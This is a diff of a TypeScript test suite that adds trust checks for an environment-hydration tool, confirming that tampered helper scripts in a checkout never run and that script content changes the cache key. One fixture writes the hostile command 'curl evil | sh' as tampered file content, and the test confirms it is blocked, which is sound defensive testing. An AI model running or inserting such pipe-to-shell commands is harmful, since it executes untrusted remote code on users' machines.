@@ -133,7 +133,42 @@ const initOpts: InitOptions = {
   agentTimeoutMs: 1000,
   smokeTimeoutMs: 1000,
   write: true,
+  requireJail: true,
 };
+
+describe("hydrate trust", () => {
+  const helper = RECIPE.replace('["npm","ci"]', '["bash",".shipwright/setup.sh"]');
+
+  test("a helper script edited in the checkout never runs under the committed recipe", async () => {
+    const f = repo();
+    f.committed.set(RECIPE_PATH, helper).set(".shipwright/setup.sh", "npm ci\n");
+    f.tree("/repo").set(".shipwright/setup.sh", "curl evil | sh\n");
+    f.script["bash .shipwright/setup.sh"] = {};
+    const o = await hydrate(f.ports(), opts());
+    expect(o.status).toBe("invalid");
+    expect(f.ran.some((r) => r.argv[0] === "bash")).toBe(false);
+  });
+
+  test("the helper script's content is part of the key", async () => {
+    const f = repo();
+    f.committed.set(RECIPE_PATH, helper).set(".shipwright/setup.sh", "v1");
+    f.tree("/repo").set(".shipwright/setup.sh", "v1");
+    f.script["bash .shipwright/setup.sh"] = {};
+    const a = await hydrate(f.ports(), opts());
+    expect(a.status).toBe("built");
+    f.committed.set(".shipwright/setup.sh", "v2");
+    f.tree("/repo").set(".shipwright/setup.sh", "v2");
+    const b = await hydrate(f.ports(), opts());
+    expect(b.key).not.toBe(a.key);
+  });
+
+  test("fingerprints run in the trusted root, never in the checkout", async () => {
+    const f = repo();
+    f.tree("/wt").set("package-lock.json", "v1");
+    await hydrate(f.ports(), { ...opts("/wt"), restoreOnly: true });
+    expect(f.ran.filter((r) => r.argv[0] === "node").map((r) => r.cwd)).toEqual(["/repo"]);
+  });
+});
 
 describe("env init", () => {
   test("feeds a setup failure back to the agent and writes the first recipe that proves out", async () => {
@@ -147,8 +182,9 @@ describe("env init", () => {
     expect(f.tasks[1]?.data).toContain("npm");
     expect(f.tasks[1]?.data).toContain("Setup failed");
     expect(f.tasks[0]?.allowedTools).toEqual(ENV_AUTHOR_TOOLS);
+    expect(f.jailed.every((j) => j)).toBe(true);
     expect(f.tree("/repo").get(RECIPE_PATH)).toBe(RECIPE);
-    expect(o.cached).toBe(true);
+    expect(f.cache.size).toBe(0); // nothing is cached before the recipe is reviewed
     expect(o.costUsd).toBeCloseTo(0.5);
     expect([...f.trees.keys()].filter((d) => d.startsWith("/scratch"))).toEqual([]);
   });
